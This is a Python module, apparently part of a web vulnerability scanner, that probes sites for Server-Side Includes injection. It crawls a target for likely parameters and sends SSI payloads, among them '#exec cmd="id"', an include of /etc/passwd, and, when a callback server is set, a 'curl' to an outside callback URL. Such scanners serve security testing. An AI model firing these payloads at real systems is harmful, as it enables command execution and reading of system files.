#!/usr/bin/env python3
"""SSI Injection Tester

Tests for Server-Side Includes (SSI) injection vulnerabilities:
- SSI injection in templates/static content
- Command execution via SSI
- File inclusion via SSI
"""

import os
import time
import requests
from typing import Dict, Any, Optional, List
from urllib.parse import urlparse


def test_ssi_injection(
    target_url: str,
    param: str = "page",
    callback_url: Optional[str] = None
) -> Dict[str, Any]:
    """Test for SSI injection vulnerabilities
    
    Args:
        target_url: Target URL
        param: Parameter to test
        callback_url: Optional callback URL for RCE validation
        
    Returns:
        Dict with test results
    """
    result = {
        "type": "ssi_injection",
        "test": "ssi_injection",
        "vulnerable": False,
        "url": target_url,  # Include URL for detection matching
        "param": param,  # Include parameter name
        "injection_method": None,
        "rce_confirmed": False,
        "evidence": None
    }
    
    # SSI injection payloads
    ssi_payloads = [
        ("<!--#exec cmd=\"id\"-->", "ssi_exec_cmd"),
        ("<!--#include file=\"/etc/passwd\"-->", "ssi_include_file"),
        ("<!--#echo var=\"DOCUMENT_NAME\"-->", "ssi_echo_var"),
        ("<!--#config timefmt=\"%A\"-->", "ssi_config"),
    ]
    
    # Add callback-based payloads if callback URL provided
    if callback_url:
        ssi_payloads.append(
            (f"<!--#exec cmd=\"curl {callback_url}\"-->", "ssi_exec_callback")
        )
    
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    
    for payload, payload_name in ssi_payloads:
        try:
            # Try GET
            resp = requests.get(
                base_url,
                params={param: payload},
                timeout=10
            )
            
            # Check for SSI execution indicators
            response_lower = resp.text.lower()
            ssi_indicators = ["uid=", "gid=", "root:", "bin/bash"]
            
            if any(ind in response_lower for ind in ssi_indicators):
                result["vulnerable"] = True
                result["injection_method"] = payload_name
                if "exec" in payload_name:
                    result["rce_confirmed"] = True
                result["evidence"] = {
                    "payload": payload,
                    "status_code": resp.status_code,
                    "response_snippet": resp.text[:500],
                    "note": "SSI injection detected"
                }
                break
                
        except Exception:
            continue
    
    return result


def test_ssi_injection_params(
    target_url: str,
    params: Optional[List[str]] = None,
    callback_url: Optional[str] = None
) -> Dict[str, Any]:
    """Test multiple parameters for SSI injection
    
    Args:
        target_url: Target URL
        params: List of parameters to test (if None, will discover)
        callback_url: Optional callback URL
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "ssi_injection_multi_param",
        "vulnerable": False,
        "findings": []
    }
    
    # Discover parameters if not provided
    if not params:
        from tools.rest_api_fuzzer import discover_parameters
        discovered_params = discover_parameters(target_url)
        # Always include common SSI injection parameter names
        ssi_params = ["page", "template", "include", "file", "view", "render"]
        params = list(set(discovered_params + ssi_params))
    
    # Test each parameter
    for param in params:
        test_result = test_ssi_injection(target_url, param=param, callback_url=callback_url)
        if test_result["vulnerable"]:
            result["vulnerable"] = True
            result["findings"].append(test_result)
    
    return result


def discover_ssi_endpoints(base_url: str) -> List[Dict[str, str]]:
    """Discover endpoints that might be vulnerable to SSI injection
    
    Args:
        base_url: Base URL
        
    Returns:
        List of dicts with url and param
    """
    endpoints = []
    
    # Common SSI-prone endpoints and their parameters
    common_endpoints = [
        ("/page", "page"),
        ("/render", "template"),
        ("/include", "file"),
        ("/template", "name"),
        ("/view", "file"),
        ("/load", "page"),
        ("/static", "file"),
        ("/content", "page"),
    ]
    
    # Add base URL with common params
    for endpoint, param in common_endpoints:
        url = f"{base_url.rstrip('/')}{endpoint}"
        endpoints.append({"url": url, "param": param})
    
    # Also test base URL
    endpoints.append({"url": base_url, "param": "page"})
    endpoints.append({"url": base_url, "param": "template"})
    
    # Try to crawl for links
    try:
        resp = requests.get(base_url, timeout=10)
        if resp.status_code == 200:
            import re
            # Find all href links
            hrefs = re.findall(r'href=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
            for href in hrefs:
                if any(kw in href.lower() for kw in ["page", "template", "render", "include", "view"]):
                    if href.startswith("/"):
                        url = f"{base_url.rstrip('/')}{href}"
                    elif href.startswith(base_url):
                        url = href
                    else:
                        continue
                    # Try to determine param from URL
                    if "=" in href:
                        param = href.split("=")[0].split("?")[-1].split("/")[-1]
                    else:
                        param = "page"
                    endpoints.append({"url": url.split("?")[0], "param": param})
    except Exception:
        pass
    
    # Deduplicate
    seen = set()
    unique = []
    for ep in endpoints:
        key = (ep["url"], ep["param"])
        if key not in seen:
            seen.add(key)
            unique.append(ep)
    
    return unique


def validate_ssi_injection(
    discovery_data: Dict[str, Any],
    callback_server_url: Optional[str] = None
) -> Dict[str, Any]:
    """Main validation function for SSI injection
    
    Args:
        discovery_data: Discovery data containing target URLs
        callback_server_url: Optional callback server URL
        
    Returns:
        Dict with validation results
    """
    results = {
        "vulnerable": False,
        "tests_run": 0,
        "findings": []
    }
    
    target = discovery_data.get("target")
    if not target:
        return results
    
    # Initialize callback if available
    callback_url = None
    if callback_server_url:
        try:
            from tools.callback_correlator import CallbackCorrelator
            correlator = CallbackCorrelator(callback_server_url)
            job_id = f"ssi_injection_{int(time.time())}"
            token = correlator.register_job(job_id, "ssi_injection", target, timeout=300)
            callback_url = correlator.get_callback_url(token)
        except Exception:
            pass
    
    # Discover SSI endpoints
    endpoints_to_test = discover_ssi_endpoints(target)
    
    # Test each endpoint
    for ep in endpoints_to_test:
        test_result = test_ssi_injection(ep["url"], param=ep["param"], callback_url=callback_url)
        results["tests_run"] += 1
        if test_result["vulnerable"]:
            results["vulnerable"] = True
            results["findings"].append(test_result)
    
    return results


if __name__ == "__main__":
    import argparse
    
    ap = argparse.ArgumentParser(description="SSI Injection Tester")
    ap.add_argument("--target", required=True, help="Target URL")
    ap.add_argument("--param", default="page", help="Parameter to test")
    ap.add_argument("--callback-server-url", help="Callback server URL")
    args = ap.parse_args()
    
    result = test_ssi_injection(args.target, param=args.param, callback_url=None)
    
    import json
    print(json.dumps(result, indent=2))

